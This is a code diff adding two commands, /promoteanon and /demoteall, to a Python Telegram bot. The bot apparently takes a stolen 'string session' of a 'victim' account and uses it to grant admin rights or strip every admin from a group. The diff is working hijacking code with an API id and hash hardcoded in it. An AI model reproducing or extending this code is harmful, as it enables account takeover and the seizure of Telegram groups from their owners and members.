@@ -418,7 +418,55 @@ async def _(event):
       eror = str(e)
       await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)
 
+@BotClient.on(events.NewMessage(incoming=True, pattern="^/promoteanon(?: |$)(.*)"))
+async def _(event):
+  if event.sender_id not in session.keys():
+    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
+  else:
+    try:
+      mat = str(event.text[13:])
+      dat = mat.split(" ", 2)
+      chat = int(dat[0])
+      user = str(dat[1])
+      if user.isdigit() or user[0] != '@':
+        return await event.reply(":Wrong Syntax:\nUse /help command to know syntax.")
+      if len(dat) == 3:
+        rank = str(dat[2])
+      else:
+        rank = "Admin"
+      string = session[event.sender_id]
+      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
+        await victim.edit_admin(chat, user, is_admin=True, title= rank)
+      await event.reply("**Promoted user as anonymous successfully!!**")
+    except Exception as e:
+      eror = str(e)
+      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)
 
+
+@BotClient.on(events.NewMessage(incoming=True, pattern="^/demoteall(?: |$)(.*)"))
+async def _(event):
+  if event.sender_id not in session.keys():
+    await event.reply("**FIRST GIVE STRING SESSION TO ME USING /string COMMAND**\n\n**Give string of victim to me by using /string cmd**\n\nExample:-\n/string <String Session>")
+  else:
+    try:
+      mat = int(event.text[11:])
+      string = session[event.sender_id]
+      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
+        result = await victim.get_participants(mat)
+        if not result:
+          return await event.reply("It seems like victim dont have ban users permission in this group.")
+        admins = await victim.get_participants(
+          mat, filter=ChannelParticipantsAdmins
+        )
+        admins_id = [i.id for i in admins]
+        for i in admins_id:
+          try:
+            await victim.edit_admin(mat, i, is_admin=False)
+          except:
+            pass
+    except Exception as e:
+      eror = str(e)
+      await event.reply("**OOPS!! Something went wrong!!**\n\n**Error:**\n%s" % eror)
 
 
 @BotClient.on(events.NewMessage(incoming=True, pattern="^/demote(?: |$)(.*)"))
